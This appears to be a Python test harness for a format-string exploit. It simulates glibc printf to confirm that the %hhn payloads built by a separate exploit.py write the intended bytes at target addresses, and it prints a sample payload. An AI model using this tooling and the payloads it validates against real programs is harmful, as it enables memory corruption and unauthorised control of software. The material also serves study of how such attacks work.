"""Simulate glibc printf for the format strings exploit.py generates, and assert
every %hhn lands on the intended byte. Run this before touching the target."""
import importlib.util
import random
import re
import sys

spec = importlib.util.spec_from_file_location("ex", "exploit.py")
ex = importlib.util.module_from_spec(spec)
spec.loader.exec_module(ex)

TOK = re.compile(rb"%(\d+)\$hhn|%(?:(\d+)c)")


def simulate(fmt, slot_addr):
    """Return {addr: byte_written} plus total chars printed."""
    cur, writes = 0, {}
    for m in TOK.finditer(fmt):
        if m.group(2) is not None:
            cur += int(m.group(2))
        else:
            writes[slot_addr[int(m.group(1))]] = cur % 256
    return writes, cur


random.seed(1337)
for trial in range(500):
    addr = (random.randrange(1 << 48) & ~0xFFF) | 0x4010
    want = [(i, random.randrange(256)) for i in range(3)]
    fmt, order = ex.build_write(None, addr, want)
    slot_addr = {13 + i: addr + off for i, (off, _v) in enumerate(order)}
    got, printed = simulate(fmt, slot_addr)
    assert len(got) == 3, (trial, fmt, got)
    for off, val in want:
        assert got.get(addr + off) == val % 256, (trial, hex(addr), want, got, fmt)
    assert len(fmt) == 40 + 24, (trial, len(fmt))
    assert fmt[40:48] == ex.p64(addr + order[0][0])

print("selftest OK: 500/500 random 3-byte %hhn writes land exactly")
print("sample fmt:", ex.build_write(None, 0x555555554010,
                                    [(0, 0x40), (1, 0x87), (2, 0x55)])[0][:44])
